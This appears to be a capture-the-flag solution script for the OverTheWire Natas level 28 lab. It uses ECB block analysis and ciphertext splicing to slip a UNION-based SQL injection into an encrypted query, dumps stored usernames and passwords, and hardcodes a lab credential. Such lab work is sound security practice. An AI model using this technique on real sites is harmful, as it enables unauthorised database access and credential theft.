#!/usr/local/bin/python3
import requests
import re
import binascii
import base64
from urllib.parse import quote, unquote
from itertools import cycle
import string

username = "natas28"
password = "JWwR438wkgTsNKBbcJoowyysdM82YjeF"

url = 'http://%s.natas.labs.overthewire.org/' % username

s = requests.session()


def cipher_text(url, plain_text):
    return base64.b64decode(unquote(s.post(url, auth=(username, password), data={"query": plain_text}).url.split("query=")[1]))


def _block_size(url):
    ciphertext = cipher_text(url, '')
    pre_len = len(ciphertext)
    idx = 0

    while pre_len >= len(ciphertext):
        plaintext = 'a' * idx
        ciphertext = cipher_text(url, plaintext)
        idx += 1

    return len(ciphertext) - pre_len


def _prefix_size(url):
    block_size = _block_size(url)
    plain_text = 'a' * block_size * 3
    cypher = cipher_text(url, plain_text)
    cipher_a = ""

    for i in range(0, len(cypher), block_size):
        if cypher[i:i + block_size] == cypher[i + block_size: i + block_size * 2]:
            cipher_a = cypher[i: i + block_size]
            break

    for i in range(block_size):
        plain_text = 'a' * (i + block_size)
        cypher = cipher_text(url, plain_text)
        if cipher_a in cypher:
            return block_size, i, cypher.index(cipher_a)


block_size, index, cypher_size = _prefix_size(url)
plain_text = 'a' * (block_size // 2)
cypher = cipher_text(url, plain_text)

sql = " UNION ALL SELECT concat(username, 0x3A ,password) FROM users #"
pt = 'a' * index + sql + 'b' * (block_size - (len(sql) % block_size))
ct = cipher_text(url, pt)
e_sql = ct[cypher_size:cypher_size - index + len(pt)]
response = s.get(f"{url}search.php/?query=", auth=(username, password), params={"query": base64.b64encode(cypher[:cypher_size] + e_sql + cypher[cypher_size:])})
print(re.findall(r"<li>natas29:(.{32})<\/li>", response.text)[0])
